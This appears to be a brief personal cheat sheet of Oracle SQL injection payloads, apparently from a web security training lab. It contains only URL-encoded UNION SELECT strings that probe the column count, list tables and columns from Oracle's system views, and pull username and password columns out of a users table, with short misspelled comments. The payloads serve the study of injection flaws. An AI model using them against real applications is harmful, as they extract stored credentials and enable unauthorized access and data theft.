
### Command
```java
*/For view posiible table  change  comlumn name  |abc|def|
'+UNION+SELECT+'abc','def'+FROM+dual--

*/For  view possible table 
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,+NULL,+NULL--

*/For request table
`'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_SIPPLL'--`

*/For specific column name change column name  end table name
`'+UNION+SELECT+USERNAME_PMZQKH,+PASSWORD_FIDQDE+FROM+USERS_SIPPLL--`



```